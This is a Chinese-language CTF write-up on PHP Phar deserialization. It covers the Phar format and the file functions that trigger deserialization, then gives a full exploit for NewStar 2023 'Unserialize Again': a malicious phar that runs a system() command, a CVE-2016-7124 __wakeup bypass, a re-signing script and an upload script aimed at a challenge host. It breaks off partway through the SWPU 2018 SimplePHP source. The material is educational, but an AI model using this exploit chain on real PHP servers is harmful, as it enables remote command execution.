    <content type="html"><![CDATA[<h2 id="Phar是什么"><a href="#Phar是什么" class="headerlink" title="Phar是什么"></a>Phar是什么</h2><p>Phar是一种文件打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。简单来说类似于ZIP和tar</p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><h3 id="1-stub文件标识"><a href="#1-stub文件标识" class="headerlink" title="1.stub文件标识"></a>1.stub文件标识</h3><ul><li>可以理解为一个标志，格式为xxx<code>&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件</li></ul><h3 id="2-manifest-（清单Phar里面内容信息）"><a href="#2-manifest-（清单Phar里面内容信息）" class="headerlink" title="2.manifest （清单Phar里面内容信息）"></a>2.manifest （清单Phar里面内容信息）</h3><ul><li>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存（当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化）</li></ul><h3 id="3-contents"><a href="#3-contents" class="headerlink" title="3. contents"></a>3. contents</h3><ul><li>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</li></ul><h3 id="4-signature（签名）"><a href="#4-signature（签名）" class="headerlink" title="4.signature（签名）"></a>4.signature（签名）</h3><ul><li>phar的最后有一段signature，是phar的签名，放在文件末尾，如果我们修改了文件的内容，之前的签名就会无效，就需要更换一个新的签名。在文件系统函数（file_exists()、is_dir()等详见下表）参数可控的情况下，配合phar:&#x2F;&#x2F;伪协议，可以不依赖unserialize()直接进行反序列化操作。</li></ul><h2 id="Phar和Phar伪协议使用环境"><a href="#Phar和Phar伪协议使用环境" class="headerlink" title="Phar和Phar伪协议使用环境"></a>Phar和Phar伪协议使用环境</h2><ul><li>php大于5.3.0</li><li>需要将php.ini的参数phar.readonly设置为off</li></ul><h2 id="如何生成一个Phar文件，下面是一个demo"><a href="#如何生成一个Phar文件，下面是一个demo" class="headerlink" title="如何生成一个Phar文件，下面是一个demo"></a>如何生成一个Phar文件，下面是一个demo</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Phar在CTF应用"><a href="#Phar在CTF应用" class="headerlink" title="Phar在CTF应用"></a>Phar在CTF应用</h2><ol><li><p>反序列化。php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下</p><table><thead><tr><th>受影响函数的列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>fileinode</td><td>filemtime</td><td>fileowner</td><td>fileperms</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeab</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table></li></ol><h4 id="以Newstar-2023-week5中-Unserialize-Again举例如何在ctf反序列化中应用"><a href="#以Newstar-2023-week5中-Unserialize-Again举例如何在ctf反序列化中应用" class="headerlink" title="以Newstar 2023 week5中 Unserialize Again举例如何在ctf反序列化中应用"></a>以Newstar 2023 week5中 Unserialize Again举例如何在ctf反序列化中应用</h4><p>题目具体函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;多吃雪梨&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>接受两个参数，其次file_get_contents(‘php:&#x2F;&#x2F;input’)接受用户POST方式提交过来的参数，将POST提交过来的参数解码放到$pear里面</p><p>，其次file_exists这个函数是检测文件或目录是否存在，但是$Adam使用phar:&#x2F;&#x2F;伪协议读取phar文件的话，自动执行<code>unserialize()</code>的操作没有依赖于<code>unserialize()</code>这个函数，而且正好在上面提及到受影响的函数中，我们最终的目标是</p><img src="/blog/2025/01/23/PHP/Phar/image-20250123202947693.png" class><p>接下来就是构造phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>;<br>&#125;                 <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">story</span>();<br><span class="hljs-variable">$a</span>-&gt;God=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$a</span>-&gt;eating=<span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其次需要<code>__wakeup()</code>因为<code>__wakeup()</code>会比<code>__destruct()</code>先执行</p><p>借助：属性个数不匹配(cve-2016-7124)来绕过</p><p>受影响版本：</p><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><img src="/blog/2025/01/23/PHP/Phar/image-20250123202851640.png" class><p>将4修改为5</p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><ul><li><p>修改后phar的文件的签名就不管用了需要重新生成一个，需要一个新的签名，签名用sha1加密，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;hack.phar&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    text = f.read()<br>s = text[:-<span class="hljs-number">28</span>]<br>h = text[-<span class="hljs-number">8</span>:]<br>newf = s + sha1(s).digest() + h<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;hacker1.phar&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(newf)<br></code></pre></td></tr></table></figure></li></ul><p>接下来就是传数据了可以用python脚本，也可以直接传有点麻烦需要将phar文件内容经过url编码后，通过POST方式传过去最后GET传 ?pear&#x3D;hacker1.phar&amp;apple&#x3D;phar:&#x2F;&#x2F;hacker1.phar 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;http://83520740-e875-4e0e-904f-7dc11b8d2a3f.node5.buuoj.cn:81/&#x27;</span><br>params=&#123;<br>    <span class="hljs-string">&#x27;pear&#x27;</span>:<span class="hljs-string">&#x27;hacker1.phar&#x27;</span>, <br>    <span class="hljs-string">&#x27;apple&#x27;</span>:<span class="hljs-string">&#x27;phar://hacker1.phar&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;22.phar&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fi:<br>    f = fi.read()<br>    ff=urllib.parse.quote(f)<br>    fin=requests.post(url=url+<span class="hljs-string">&quot;pairing.php&quot;</span>,data=ff,params=params)<br>    <span class="hljs-built_in">print</span>(fin.text)<br></code></pre></td></tr></table></figure><h4 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="SWPU 2018-SimplePHP"></a>SWPU 2018-SimplePHP</h4><p>考点：php反序列化+phar</p><p>给了三个文件class.php,file.php,upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#upload.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__);</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>;<span class="hljs-comment">#没什么用最后只是调用了upload_file方法。</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span 